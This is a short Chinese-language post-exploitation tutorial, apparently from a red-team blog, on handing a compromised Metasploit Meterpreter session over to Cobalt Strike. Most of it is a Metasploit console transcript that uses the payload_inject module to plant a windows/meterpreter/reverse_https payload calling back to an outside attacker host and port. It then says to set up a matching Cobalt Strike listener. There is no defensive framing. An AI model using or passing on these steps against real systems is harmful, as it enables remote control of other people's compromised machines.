## Meterpreter转Beacon

首先我们先拿到一个Meterpreter，用backgroud挂起，然后利用payload\_inject模块。

```
1.  `meterpreter > background`
    
2.  `[*] Backgrounding session 1...`
    
3.  `msf5 exploit(multi/handler) > use exploit/windows/local/payload_inject`
    
4.  `msf5 exploit(windows/local/payload_inject) > set payload windows/meterpreter/reverse_https`
    
5.  `payload => windows/meterpreter/reverse_https`
    
6.  `msf5 exploit(windows/local/payload_inject) > set lhost 1xx.xxx.xxx.xxx`
    
7.  `lhost => 1xx.xxx.xxx.xxx`
    
8.  `msf5 exploit(windows/local/payload_inject) > set lport 11414`
    
9.  `lport => 11414`
    
10.  `msf5 exploit(windows/local/payload_inject) > set session 1`
     
11.  `session => 1`
     
12.  `msf5 exploit(windows/local/payload_inject) > set disablepayloadhandler true`
     
13.  `disablepayloadhandler => true`
     
14.  `msf5 exploit(windows/local/payload_inject) > exploit -j`
     
15.  `[*] Exploit running as background job 4.`
     
```

其中设置disablepayloadhandler是为了防止msf的payload handler监听冲突。  
在cs中根据上面设置的pyayload设置一个监听器即可。
